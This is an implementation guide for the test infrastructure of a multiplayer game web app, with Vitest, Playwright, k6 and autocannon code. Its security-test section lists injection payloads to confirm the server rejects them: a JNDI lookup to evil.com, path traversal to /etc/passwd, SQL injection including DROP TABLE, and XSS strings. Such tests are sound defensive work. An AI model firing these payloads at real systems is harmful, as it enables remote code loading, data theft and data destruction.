# Phase 2 Implementation Guide: Testing Infrastructure Expansion

## Overview
Comprehensive testing strategy to achieve 90%+ test coverage with integration tests, E2E tests, and performance testing.

## 1. Testing Architecture

### 1.1 Test Structure
```
tests/
├── unit/                    # Unit tests (95% coverage target)
│   ├── components/         # React component tests
│   ├── hooks/             # Custom hooks tests
│   ├── utils/             # Utility function tests
│   ├── middleware/        # Server middleware tests
│   └── services/          # Service layer tests
├── integration/            # Integration tests (85% coverage target)
│   ├── api/              # API endpoint tests
│   ├── database/         # Database operation tests
│   ├── websocket/        # WebSocket integration tests
│   └── auth/             # Authentication flow tests
├── e2e/                   # End-to-end tests (100% critical flows)
│   ├── user-flows/       # Complete user journey tests
│   ├── admin-flows/      # Admin interface tests
│   └── game-flows/       # Game session tests
├── performance/           # Performance and load tests
│   ├── load/             # Load testing scenarios
│   ├── stress/           # Stress testing scenarios
│   └── benchmarks/       # Performance benchmarks
└── security/              # Security testing
    ├── penetration/      # Penetration testing
    └── vulnerability/    # Vulnerability scanning
```

### 1.2 Testing Tools Configuration

#### Vitest Configuration Enhancement
```typescript
// vitest.config.ts - Enhanced configuration
import { defineConfig } from 'vitest/config';
import { resolve } from 'path';

export default defineConfig({
  test: {
    globals: true,
    environment: 'happy-dom',
    setupFiles: ['./tests/setup.ts'],
    include: ['**/*.{test,spec}.{js,mjs,cjs,ts,mts,cts,jsx,tsx}'],
    exclude: ['**/node_modules/**', '**/e2e/**', '**/performance/**'],
    
    // Enhanced coverage configuration
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html', 'lcov'],
      reportsDirectory: './coverage',
      exclude: [
        'coverage/**',
        'dist/**',
        '**/*.d.ts',
        'e2e/**',
        'performance/**',
        '**/*.config.*',
        'scripts/**'
      ],
      thresholds: {
        global: {
          branches: 90,
          functions: 90,
          lines: 90,
          statements: 90
        },
        // Per-file thresholds for critical components
        './server/auth/': {
          branches: 95,
          functions: 95,
          lines: 95,
          statements: 95
        },
        './server/middleware/security.ts': {
          branches: 100,
          functions: 100,
          lines: 100,
          statements: 100
        }
      }
    },
    
    // Test timeout configuration
    testTimeout: 10000,
    hookTimeout: 10000,
    
    // Parallel execution
    threads: true,
    maxThreads: 4,
    
    // Reporter configuration
    reporter: ['verbose', 'json', 'html'],
    outputFile: {
      json: './test-results/results.json',
      html: './test-results/report.html'
    }
  },
  
  resolve: {
    alias: {
      '@': resolve(__dirname, './client/src'),
      '@shared': resolve(__dirname, './shared'),
      '@server': resolve(__dirname, './server'),
      '@tests': resolve(__dirname, './tests')
    }
  }
});
```

#### Playwright Configuration for E2E
```typescript
// playwright.config.ts - Enhanced E2E configuration
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  testDir: './e2e',
  fullyParallel: true,
  forbidOnly: !!process.env.CI,
  retries: process.env.CI ? 2 : 0,
  workers: process.env.CI ? 1 : undefined,
  
  reporter: [
    ['html'],
    ['json', { outputFile: 'test-results/e2e-results.json' }],
    ['junit', { outputFile: 'test-results/e2e-results.xml' }]
  ],
  
  use: {
    baseURL: 'http://localhost:5173',
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
    video: 'retain-on-failure'
  },

  projects: [
    // Desktop browsers
    {
      name: 'chromium',
      use: { ...devices['Desktop Chrome'] },
    },
    {
      name: 'firefox',
      use: { ...devices['Desktop Firefox'] },
    },
    {
      name: 'webkit',
      use: { ...devices['Desktop Safari'] },
    },
    
    // Mobile devices
    {
      name: 'Mobile Chrome',
      use: { ...devices['Pixel 5'] },
    },
    {
      name: 'Mobile Safari',
      use: { ...devices['iPhone 12'] },
    },
  ],

  webServer: [
    {
      command: 'npm run dev',
      port: 5173,
      reuseExistingServer: !process.env.CI,
      timeout: 120000
    }
  ]
});
```

## 2. Unit Testing Implementation

### 2.1 React Component Testing
```typescript
// tests/unit/components/AdminInterface.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { AdminInterface } from '@/components/AdminInterface';
import { mockUser, mockAssets, mockPlayers } from '@tests/fixtures';

describe('AdminInterface', () => {
  let queryClient: QueryClient;

  beforeEach(() => {
    queryClient = new QueryClient({
      defaultOptions: { queries: { retry: false } }
    });
  });

  const renderAdminInterface = (props = {}) => {
    return render(
      <QueryClientProvider client={queryClient}>
        <AdminInterface
          roomId="test-room"
          assets={mockAssets}
          boardAssets={[]}
          players={mockPlayers}
          currentUser={mockUser}
          onAssetUploaded={jest.fn()}
          onSwitchView={jest.fn()}
          {...props}
        />
      </QueryClientProvider>
    );
  };

  describe('Asset Management', () => {
    it('should display uploaded assets', () => {
      renderAdminInterface();
      
      expect(screen.getByTestId('tab-assets')).toBeInTheDocument();
      expect(screen.getByText('Upload Game Assets')).toBeInTheDocument();
    });

    it('should handle asset upload', async () => {
      const onAssetUploaded = jest.fn();
      renderAdminInterface({ onAssetUploaded });
      
      const fileInput = screen.getByLabelText(/upload/i);
      const file = new File(['test'], 'test.png', { type: 'image/png' });
      
      fireEvent.change(fileInput, { target: { files: [file] } });
      
      await waitFor(() => {
        expect(onAssetUploaded).toHaveBeenCalledWith(expect.objectContaining({
          name: 'test.png',
          type: 'image/png'
        }));
      });
    });
  });

  describe('Player Management', () => {
    it('should display online players', () => {
      renderAdminInterface();
      
      fireEvent.click(screen.getByTestId('tab-players'));
      
      const onlinePlayers = mockPlayers.filter(p => p.isOnline);
      onlinePlayers.forEach(player => {
        expect(screen.getByTestId(`player-${player.playerId}`)).toBeInTheDocument();
      });
    });

    it('should handle player role changes', async () => {
      renderAdminInterface();
      
      fireEvent.click(screen.getByTestId('tab-players'));
      
      const roleSelect = screen.getByLabelText(/role/i);
      fireEvent.change(roleSelect, { target: { value: 'admin' } });
      
      await waitFor(() => {
        expect(roleSelect).toHaveValue('admin');
      });
    });
  });
});
```

### 2.2 Custom Hooks Testing
```typescript
// tests/unit/hooks/useWebSocket.test.ts
import { renderHook, act } from '@testing-library/react';
import { useWebSocket } from '@/hooks/useWebSocket';
import WS from 'jest-websocket-mock';

describe('useWebSocket', () => {
  let server: WS;
  const url = 'ws://localhost:8080';

  beforeEach(() => {
    server = new WS(url);
  });

  afterEach(() => {
    WS.clean();
  });

  it('should connect to WebSocket server', async () => {
    const { result } = renderHook(() => useWebSocket(url));

    await server.connected;
    
    expect(result.current.connectionState).toBe('connected');
    expect(result.current.error).toBeNull();
  });

  it('should handle incoming messages', async () => {
    const onMessage = jest.fn();
    const { result } = renderHook(() => useWebSocket(url, { onMessage }));

    await server.connected;

    const testMessage = { type: 'test', data: { message: 'hello' } };
    
    act(() => {
      server.send(JSON.stringify(testMessage));
    });

    expect(onMessage).toHaveBeenCalledWith(testMessage);
  });

  it('should send messages', async () => {
    const { result } = renderHook(() => useWebSocket(url));

    await server.connected;

    const message = { type: 'move', data: { x: 100, y: 200 } };
    
    act(() => {
      result.current.sendMessage(message);
    });

    await expect(server).toReceiveMessage(JSON.stringify(message));
  });

  it('should handle connection errors', async () => {
    const { result } = renderHook(() => useWebSocket('ws://invalid:9999'));

    await act(async () => {
      await new Promise(resolve => setTimeout(resolve, 100));
    });

    expect(result.current.connectionState).toBe('disconnected');
    expect(result.current.error).toBeTruthy();
  });
});
```

### 2.3 Server Middleware Testing
```typescript
// tests/unit/middleware/auth.test.ts
import { Request, Response, NextFunction } from 'express';
import { authenticateToken } from '@server/auth/middleware';
import { validateFirebaseToken } from '@server/auth/tokenValidator';
import { createMockRequest, createMockResponse } from '@tests/utils/express-mocks';

jest.mock('@server/auth/tokenValidator');

describe('Authentication Middleware', () => {
  let mockRequest: Partial<Request>;
  let mockResponse: Partial<Response>;
  let nextFunction: NextFunction;

  beforeEach(() => {
    mockRequest = createMockRequest();
    mockResponse = createMockResponse();
    nextFunction = jest.fn();
    jest.clearAllMocks();
  });

  describe('authenticateToken', () => {
    it('should authenticate valid token', async () => {
      const mockUser = { uid: 'user123', email: 'test@example.com' };
      (validateFirebaseToken as jest.Mock).mockResolvedValue(mockUser);
      
      mockRequest.headers = {
        authorization: 'Bearer valid-token'
      };

      await authenticateToken(
        mockRequest as Request,
        mockResponse as Response,
        nextFunction
      );

      expect(mockRequest.user).toEqual(mockUser);
      expect(nextFunction).toHaveBeenCalled();
    });

    it('should reject request without token', async () => {
      mockRequest.headers = {};

      await authenticateToken(
        mockRequest as Request,
        mockResponse as Response,
        nextFunction
      );

      expect(mockResponse.status).toHaveBeenCalledWith(401);
      expect(mockResponse.json).toHaveBeenCalledWith({
        error: 'Authentication required',
        message: 'Valid authentication token must be provided'
      });
      expect(nextFunction).not.toHaveBeenCalled();
    });

    it('should reject invalid token', async () => {
      (validateFirebaseToken as jest.Mock).mockRejectedValue(
        new Error('Invalid token')
      );
      
      mockRequest.headers = {
        authorization: 'Bearer invalid-token'
      };

      await authenticateToken(
        mockRequest as Request,
        mockResponse as Response,
        nextFunction
      );

      expect(mockResponse.status).toHaveBeenCalledWith(401);
      expect(nextFunction).not.toHaveBeenCalled();
    });
  });
});
```

## 3. Integration Testing Implementation

### 3.1 API Integration Tests
```typescript
// tests/integration/api/rooms.test.ts
import request from 'supertest';
import { app } from '@server/index';
import { db } from '@server/db';
import { gameRooms, users } from '@shared/schema';
import { createTestUser, createAuthToken, cleanupDatabase } from '@tests/utils/test-helpers';

describe('Room API Integration', () => {
  let testUser: any;
  let authToken: string;

  beforeAll(async () => {
    await cleanupDatabase();
    testUser = await createTestUser();
    authToken = await createAuthToken(testUser.uid);
  });

  afterAll(async () => {
    await cleanupDatabase();
  });

  describe('POST /api/rooms', () => {
    it('should create a new room', async () => {
      const roomData = {
        name: 'Test Room',
        gameSystemId: 'system-123'
      };

      const response = await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${authToken}`)
        .send(roomData)
        .expect(201);

      expect(response.body.data).toMatchObject({
        name: roomData.name,
        createdBy: testUser.uid,
        isActive: true
      });

      // Verify database state
      const createdRoom = await db
        .select()
        .from(gameRooms)
        .where(eq(gameRooms.id, response.body.data.id))
        .limit(1);

      expect(createdRoom).toHaveLength(1);
      expect(createdRoom[0].name).toBe(roomData.name);
    });

    it('should reject duplicate room names', async () => {
      const roomData = { name: 'Duplicate Room' };

      // Create first room
      await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${authToken}`)
        .send(roomData)
        .expect(201);

      // Attempt to create duplicate
      const response = await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${authToken}`)
        .send(roomData)
        .expect(409);

      expect(response.body.error).toBe('Room name already exists');
    });

    it('should require authentication', async () => {
      const roomData = { name: 'Unauthorized Room' };

      await request(app)
        .post('/api/rooms')
        .send(roomData)
        .expect(401);
    });
  });

  describe('GET /api/rooms/:roomId', () => {
    let testRoom: any;

    beforeEach(async () => {
      const response = await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ name: 'Test Room for GET' })
        .expect(201);
      
      testRoom = response.body.data;
    });

    it('should return room details', async () => {
      const response = await request(app)
        .get(`/api/rooms/${testRoom.id}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body.data).toMatchObject({
        id: testRoom.id,
        name: testRoom.name,
        createdBy: testUser.uid
      });
    });

    it('should return 404 for non-existent room', async () => {
      await request(app)
        .get('/api/rooms/non-existent-id')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);
    });
  });
});
```

### 3.2 WebSocket Integration Tests
```typescript
// tests/integration/websocket/game-session.test.ts
import { WebSocket } from 'ws';
import { createTestServer } from '@tests/utils/test-server';
import { createTestUser, createAuthToken } from '@tests/utils/test-helpers';

describe('WebSocket Game Session Integration', () => {
  let server: any;
  let baseUrl: string;
  let testUser1: any;
  let testUser2: any;
  let authToken1: string;
  let authToken2: string;

  beforeAll(async () => {
    server = await createTestServer();
    baseUrl = `ws://localhost:${server.port}`;
    
    testUser1 = await createTestUser();
    testUser2 = await createTestUser();
    authToken1 = await createAuthToken(testUser1.uid);
    authToken2 = await createAuthToken(testUser2.uid);
  });

  afterAll(async () => {
    await server.close();
  });

  describe('Multi-client room interaction', () => {
    it('should synchronize asset movements between clients', async () => {
      const ws1 = new WebSocket(`${baseUrl}/ws`);
      const ws2 = new WebSocket(`${baseUrl}/ws`);

      // Wait for connections
      await Promise.all([
        new Promise(resolve => ws1.on('open', resolve)),
        new Promise(resolve => ws2.on('open', resolve))
      ]);

      // Authenticate both clients
      ws1.send(JSON.stringify({
        type: 'auth:authenticate',
        data: { token: authToken1 }
      }));

      ws2.send(JSON.stringify({
        type: 'auth:authenticate',
        data: { token: authToken2 }
      }));

      // Wait for authentication
      await new Promise(resolve => setTimeout(resolve, 100));

      // Create test room and join both clients
      const roomId = 'test-room-' + Date.now();
      
      ws1.send(JSON.stringify({
        type: 'room:join',
        data: { roomId }
      }));

      ws2.send(JSON.stringify({
        type: 'room:join',
        data: { roomId }
      }));

      // Set up message listeners
      const ws2Messages: any[] = [];
      ws2.on('message', (data) => {
        ws2Messages.push(JSON.parse(data.toString()));
      });

      // Client 1 moves an asset
      const moveEvent = {
        type: 'asset:moved',
        data: {
          assetId: 'test-asset-123',
          position: { x: 100, y: 200 },
          playerId: testUser1.uid
        }
      };

      ws1.send(JSON.stringify(moveEvent));

      // Wait for synchronization
      await new Promise(resolve => setTimeout(resolve, 100));

      // Verify client 2 received the move event
      const receivedMoveEvent = ws2Messages.find(msg => 
        msg.type === 'asset:moved' && msg.data.assetId === 'test-asset-123'
      );

      expect(receivedMoveEvent).toBeDefined();
      expect(receivedMoveEvent.data.position).toEqual({ x: 100, y: 200 });

      ws1.close();
      ws2.close();
    });

    it('should handle concurrent card operations', async () => {
      const ws1 = new WebSocket(`${baseUrl}/ws`);
      const ws2 = new WebSocket(`${baseUrl}/ws`);

      // Setup and authentication (similar to above)
      // ...

      // Simulate concurrent card draws
      const drawPromises = [
        new Promise(resolve => {
          ws1.send(JSON.stringify({
            type: 'card:draw',
            data: { deckId: 'test-deck', count: 1 }
          }));
          ws1.once('message', resolve);
        }),
        new Promise(resolve => {
          ws2.send(JSON.stringify({
            type: 'card:draw',
            data: { deckId: 'test-deck', count: 1 }
          }));
          ws2.once('message', resolve);
        })
      ];

      const results = await Promise.all(drawPromises);

      // Verify both operations succeeded and cards are different
      expect(results).toHaveLength(2);
      // Add specific assertions based on card system logic

      ws1.close();
      ws2.close();
    });
  });

  describe('Connection resilience', () => {
    it('should handle connection drops and reconnection', async () => {
      const ws = new WebSocket(`${baseUrl}/ws`);
      
      await new Promise(resolve => ws.on('open', resolve));

      // Authenticate
      ws.send(JSON.stringify({
        type: 'auth:authenticate',
        data: { token: authToken1 }
      }));

      // Force disconnect
      ws.terminate();

      // Reconnect
      const ws2 = new WebSocket(`${baseUrl}/ws`);
      await new Promise(resolve => ws2.on('open', resolve));

      // Re-authenticate
      ws2.send(JSON.stringify({
        type: 'auth:authenticate',
        data: { token: authToken1 }
      }));

      // Verify successful reconnection
      const authResponse = await new Promise(resolve => {
        ws2.once('message', resolve);
      });

      expect(JSON.parse(authResponse.toString()).type).toBe('auth:success');

      ws2.close();
    });
  });
});
```

## 4. End-to-End Testing Implementation

### 4.1 Complete User Journey Tests
```typescript
// e2e/user-flows/complete-game-session.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Complete Game Session Flow', () => {
  test('should support full game lifecycle', async ({ page, context }) => {
    // Step 1: Authentication
    await page.goto('/');
    await page.click('[data-testid="sign-in-button"]');
    
    // Mock Firebase auth for E2E
    await page.evaluate(() => {
      window.mockUser = {
        uid: 'e2e-user-123',
        email: 'e2e@test.com',
        displayName: 'E2E Test User'
      };
    });

    // Step 2: Create new room
    await page.click('[data-testid="create-room-button"]');
    await page.fill('[data-testid="room-name-input"]', 'E2E Test Room');
    await page.click('[data-testid="create-room-submit"]');

    await expect(page).toHaveURL(/\/room\/.+/);

    // Step 3: Upload game assets
    await page.click('[data-testid="admin-interface-button"]');
    await page.click('[data-testid="tab-assets"]');

    const fileInput = page.locator('input[type="file"]');
    await fileInput.setInputFiles('./tests/fixtures/test-card.png');

    await expect(page.locator('[data-testid^="asset-"]')).toBeVisible();

    // Step 4: Place assets on board
    await page.click('[data-testid="switch-to-gm"]');
    
    const asset = page.locator('[data-testid^="asset-"]').first();
    const board = page.locator('[data-testid="game-board"]');
    
    await asset.dragTo(board);

    // Verify asset is placed
    await expect(board.locator('[data-testid^="board-asset-"]')).toBeVisible();

    // Step 5: Game interaction
    const boardAsset = board.locator('[data-testid^="board-asset-"]').first();
    
    // Move asset
    await boardAsset.dragTo(board, {
      targetPosition: { x: 200, y: 200 }
    });

    // Flip asset
    await boardAsset.click({ button: 'right' });
    await page.click('[data-testid="flip-asset"]');

    // Step 6: Dice rolling
    await page.click('[data-testid="dice-roller"]');
    await page.selectOption('[data-testid="dice-type"]', 'd20');
    await page.click('[data-testid="roll-dice"]');

    await expect(page.locator('[data-testid="dice-result"]')).toBeVisible();

    // Step 7: Chat functionality
    await page.fill('[data-testid="chat-input"]', 'Test message from E2E');
    await page.press('[data-testid="chat-input"]', 'Enter');

    await expect(page.locator('[data-testid="chat-messages"]'))
      .toContainText('Test message from E2E');

    // Step 8: Save game state
    await page.click('[data-testid="save-game"]');
    await expect(page.locator('[data-testid="save-success"]')).toBeVisible();
  });

  test('should handle multiplayer interactions', async ({ browser }) => {
    // Create two browser contexts for multiplayer testing
    const context1 = await browser.newContext();
    const context2 = await browser.newContext();
    
    const page1 = await context1.newPage();
    const page2 = await context2.newPage();

    // Player 1 creates room
    await page1.goto('/');
    // ... authentication and room creation

    const roomUrl = page1.url();

    // Player 2 joins room
    await page2.goto(roomUrl);
    // ... authentication

    // Verify both players see each other
    await expect(page1.locator('[data-testid="player-list"]'))
      .toContainText('Player 2');
    await expect(page2.locator('[data-testid="player-list"]'))
      .toContainText('Player 1');

    // Player 1 moves asset
    const asset1 = page1.locator('[data-testid^="board-asset-"]').first();
    await asset1.dragTo(page1.locator('[data-testid="game-board"]'), {
      targetPosition: { x: 300, y: 300 }
    });

    // Verify Player 2 sees the movement
    await expect(page2.locator('[data-testid^="board-asset-"]').first())
      .toHaveCSS('transform', /translate\(300px, 300px\)/);

    await context1.close();
    await context2.close();
  });
});
```

### 4.2 Admin Interface E2E Tests
```typescript
// e2e/admin-flows/game-system-management.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Game System Management', () => {
  test('should create and manage game systems', async ({ page }) => {
    await page.goto('/admin');
    
    // Navigate to game systems
    await page.click('[data-testid="game-systems-tab"]');

    // Create new game system
    await page.click('[data-testid="create-system-button"]');
    await page.fill('[data-testid="system-name"]', 'Test Card Game');
    await page.fill('[data-testid="system-description"]', 'E2E test system');
    await page.selectOption('[data-testid="system-category"]', 'card-game');
    
    await page.click('[data-testid="save-system"]');

    // Verify system appears in list
    await expect(page.locator('[data-testid="systems-list"]'))
      .toContainText('Test Card Game');

    // Upload system assets
    await page.click('[data-testid="system-assets-tab"]');
    const fileInput = page.locator('input[type="file"]').first();
    await fileInput.setInputFiles([
      './tests/fixtures/card-back.png',
      './tests/fixtures/card-front.png'
    ]);

    await expect(page.locator('[data-testid="asset-upload-success"]'))
      .toBeVisible();

    // Publish system
    await page.click('[data-testid="publish-system"]');
    await expect(page.locator('[data-testid="system-status"]'))
      .toContainText('Published');
  });
});
```

## 5. Performance Testing Implementation

### 5.1 Load Testing with k6
```javascript
// tests/performance/load/websocket-load.js
import ws from 'k6/ws';
import { check } from 'k6';

export let options = {
  stages: [
    { duration: '30s', target: 50 },
    { duration: '1m', target: 100 },
    { duration: '30s', target: 0 }
  ],
  thresholds: {
    ws_connecting: ['avg<1000'],
    ws_msgs_received: ['count>0'],
    ws_session_duration: ['avg<60000']
  }
};

export default function() {
  const url = 'ws://localhost:5000/ws';
  
  const response = ws.connect(url, {}, function(socket) {
    socket.on('open', () => {
      console.log('Connected');
      
      // Authenticate
      socket.send(JSON.stringify({
        type: 'auth:authenticate',
        data: { token: 'test-token' }
      }));

      // Join room
      socket.send(JSON.stringify({
        type: 'room:join',
        data: { roomId: 'load-test-room' }
      }));

      // Simulate game activity
      setInterval(() => {
        socket.send(JSON.stringify({
          type: 'asset:moved',
          data: {
            assetId: 'test-asset',
            position: {
              x: Math.random() * 800,
              y: Math.random() * 600
            }
          }
        }));
      }, 2000);
    });

    socket.on('message', (data) => {
      check(data, {
        'message received': (msg) => msg.length > 0
      });
    });

    socket.on('close', () => console.log('Disconnected'));
  });

  check(response, {
    'status is 101': (r) => r && r.status === 101
  });
}
```

### 5.2 API Performance Tests
```typescript
// tests/performance/api/endpoints.test.ts
import autocannon from 'autocannon';
import { test } from 'vitest';

test('API Performance Benchmarks', async () => {
  const baseUrl = 'http://localhost:5000';
  
  // Test room creation endpoint
  const roomCreationResult = await autocannon({
    url: `${baseUrl}/api/rooms`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer test-token'
    },
    body: JSON.stringify({
      name: 'Performance Test Room'
    }),
    duration: 30,
    connections: 10
  });

  console.log('Room Creation Performance:', roomCreationResult);
  
  // Assertions
  expect(roomCreationResult.latency.average).toBeLessThan(100);
  expect(roomCreationResult.requests.average).toBeGreaterThan(50);

  // Test asset retrieval endpoint
  const assetRetrievalResult = await autocannon({
    url: `${baseUrl}/api/rooms/test-room/assets`,
    method: 'GET',
    headers: {
      'Authorization': 'Bearer test-token'
    },
    duration: 30,
    connections: 20
  });

  console.log('Asset Retrieval Performance:', assetRetrievalResult);
  
  expect(assetRetrievalResult.latency.average).toBeLessThan(50);
  expect(assetRetrievalResult.requests.average).toBeGreaterThan(100);
});
```

## 6. Security Testing Implementation

### 6.1 Penetration Testing
```typescript
// tests/security/penetration/auth-bypass.test.ts
import request from 'supertest';
import { app } from '@server/index';

describe('Authentication Security Tests', () => {
  describe('Token Bypass Attempts', () => {
    it('should reject malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid',
        'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid',
        'Bearer ../../../etc/passwd',
        'Bearer <script>alert("xss")</script>',
        'Bearer ${jndi:ldap://evil.com/a}'
      ];

      for (const token of malformedTokens) {
        await request(app)
          .get('/api/rooms')
          .set('Authorization', token)
          .expect(401);
      }
    });

    it('should prevent SQL injection in user ID', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --"
      ];

      for (const payload of sqlInjectionPayloads) {
        await request(app)
          .get(`/api/users/${encodeURIComponent(payload)}`)
          .set('Authorization', 'Bearer valid-token')
          .expect(res => {
            // Should not return sensitive data or cause errors
            expect(res.status).not.toBe(500);
            expect(res.body).not.toHaveProperty('password');
          });
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize user input in room names', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/rooms')
          .set('Authorization', 'Bearer valid-token')
          .send({ name: payload })
          .expect(201);

        // Verify the response doesn't contain executable scripts
        expect(response.body.data.name).not.toContain('<script>');
        expect(response.body.data.name).not.toContain('javascript:');
      }
    });
  });
});
```

## 7. Implementation Timeline

### Week 1: Setup & Unit Tests
- [ ] Configure enhanced Vitest setup
- [ ] Create testing utilities and fixtures
- [ ] Implement React component unit tests
- [ ] Write custom hooks tests
- [ ] Add server middleware tests

### Week 2: Integration Tests
- [ ] Set up test database
- [ ] Implement API integration tests
- [ ] Create WebSocket integration tests
- [ ] Add authentication flow tests

### Week 3: E2E Tests
- [ ] Configure Playwright
- [ ] Implement critical user journey tests
- [ ] Add admin interface E2E tests
- [ ] Create multiplayer interaction tests

### Week 4: Performance & Security
- [ ] Set up k6 load testing
- [ ] Implement API performance benchmarks
- [ ] Add WebSocket load tests
- [ ] Create security penetration tests
- [ ] Set up automated test reporting

## 8. Success Metrics

### Coverage Targets
- **Unit Tests**: 95% line coverage
- **Integration Tests**: 85% API endpoint coverage
- **E2E Tests**: 100% critical user flow coverage
- **Performance Tests**: All endpoints <100ms (95th percentile)
- **Security Tests**: Zero critical vulnerabilities

### Quality Gates
- All tests must pass before deployment
- Coverage thresholds enforced in CI/CD
- Performance benchmarks as regression tests
- Security scans integrated into pipeline

---

**Implementation Priority**: High  
**Estimated Effort**: 4 weeks  
**Dependencies**: Phase 1 completion  
**Risk Level**: Medium
